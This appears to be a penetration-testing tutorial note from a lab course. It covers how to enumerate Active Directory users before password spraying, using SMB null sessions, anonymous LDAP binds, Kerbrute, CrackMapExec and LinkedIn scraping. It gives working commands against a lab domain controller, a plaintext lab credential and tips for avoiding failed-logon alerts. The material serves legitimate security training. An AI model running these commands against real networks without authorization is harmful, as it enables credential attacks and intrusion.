This document outlines the various techniques, tools, and methodologies used to harvest valid Active Directory user lists required to execute an effective password spraying attack.
1. SMB NULL Sessions
2. LDAP Anonymous Binds
3. Kerberos Enumeration (Kerbrute)

4. CrackMapExec (Credential Enumeration)
### Phase 1: Unauthenticated Methods (No Credentials Required)
When operating with an internal network position but lacking domain credentials, user lists can be pulled via unauthenticated services or brute-forced via Kerberos.

#### 1. SMB NULL Sessions
Misconfigured Domain Controllers (often legacy upgrades) may permit anonymous access to retrieve domain user listings.
#### Retrieve domain user list
- **Using `enum4linux`:**
    ```Bash
    enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
    
    administrator
	guest
    ```
- **Using `rpcclient`:**
    ```Bash
    rpcclient -U "" -N 172.16.5.5
    rpcclient $> enumdomusers
    
    user:[administrator] rid:[0x1f4]
	user:[guest] rid:[0x1f5]
    ```

#### 2. LDAP Anonymous Binds
If the domain permits anonymous LDAP queries, pull complete user objects directly.
- **Using `ldapsearch`:**
    ```Bash
    ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
    
    guest
	ACADEMY-EA-DC01$
	ACADEMY-EA-MS01$
    ```
- **Using `windapsearch`:**
    ```Bash
    ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
    ```
    
#### 3. Kerberos Enumeration (`Kerbrute`)
If no direct protocol access (SMB/LDAP) is allowed, use `Kerbrute` to perform user enumeration via Kerberos pre-authentication without generating Windows Event ID 4625 (logon failures):
```Bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```
- _Note:_ While username enumeration via Kerbrute avoids triggering bad password counters, switching the same tool to password spraying _will_ count towards failed login attempts and risk account lockouts.
    

### Phase 2: Credentialed Enumeration
If valid domain credentials have already been gathered (via LLMNR poisoning, prior spray successes, or client provisioning), enumeration becomes faster and more granular.
#### Using CrackMapExec
Query Active Directory with credentials to pull users alongside their current `badpwdcount` and `baddpwdtime`:

```Bash
crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```
- **Why this matters:** Reviewing `badpwdcount` allows you to filter out accounts that are already close to the lockout threshold, preventing accidental account lockouts during a spray.
    
### Phase 3: External & OSINT Alternatives
If internal network checks fail completely, rely on external reconnaissance:
- **Email Harvesting:** Collect public email structures from company domains.
- **LinkedIn Scraping (`linkedin2username`):** Generate statistically probable corporate username variations based on employee directories.

### Phase 4: Operational Best Practices & Logging
Regardless of how the target user list is built, proper tracking is mandatory:
1. **Filter Thresholds:** Exclude any accounts nearing the lockout limit (`badpwdcount`).
2. **Maintain Activity Logs:** Record the targeted accounts, Domain Controller used, timestamps, and attempted passwords to avoid duplicate efforts.
3. **Accountability:** If lockouts or security alerts occur during testing, structured logs allow you to verify your actions and assist defenders in cross-checking SIEM logs.